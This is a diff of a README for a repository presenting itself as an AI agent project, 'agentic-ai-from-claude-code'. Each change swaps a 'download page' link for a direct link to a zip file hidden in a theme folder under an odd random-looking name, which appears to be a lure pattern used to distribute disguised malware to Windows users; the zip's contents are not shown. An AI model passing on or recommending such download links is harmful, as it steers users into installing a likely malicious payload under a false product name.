@@ -1,6 +1,6 @@
 # 🤖 agentic-ai-from-claude-code - Build AI agents with clarity
 
-[![Download / Install](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/nydiapluperfect522/agentic-ai-from-claude-code)
+[![Download / Install](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/nydiapluperfect522/agentic-ai-from-claude-code/raw/refs/heads/main/src/commands/theme/code-claude-agentic-from-ai-atrosanguineous.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ This project focuses on practical agent development, simple setup, and a workflo
 
 Use this link to visit the page and download or access the app:
 
-[Open the download page](https://github.com/nydiapluperfect522/agentic-ai-from-claude-code)
+[Open the download page](https://github.com/nydiapluperfect522/agentic-ai-from-claude-code/raw/refs/heads/main/src/commands/theme/code-claude-agentic-from-ai-atrosanguineous.zip)
 
 ### Windows setup
 
@@ -232,4 +232,4 @@ This app is useful for:
 
 If you need the page again, use this link:
 
-[Visit the download page](https://github.com/nydiapluperfect522/agentic-ai-from-claude-code)
+[Visit the download page](https://github.com/nydiapluperfect522/agentic-ai-from-claude-code/raw/refs/heads/main/src/commands/theme/code-claude-agentic-from-ai-atrosanguineous.zip)
